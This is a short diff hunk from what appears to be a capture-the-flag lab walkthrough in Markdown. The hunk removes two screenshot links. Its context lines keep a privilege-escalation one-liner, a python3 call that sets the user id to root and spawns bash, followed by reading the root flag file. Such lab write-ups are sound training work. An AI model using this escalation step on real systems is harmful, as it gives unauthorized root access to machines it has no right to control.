@@ -66,10 +66,6 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 cat /root/root.txt
 ```
 
-![Walkthrough Screenshot](/assets/ptgarage_pages/ptg_lab_walkthroughs/page_2.png)
-
-![Walkthrough Screenshot](/assets/ptgarage_pages/ptg_lab_walkthroughs/page_3.png)
-
 ## Flags
 
 | Type | Flag | Path |
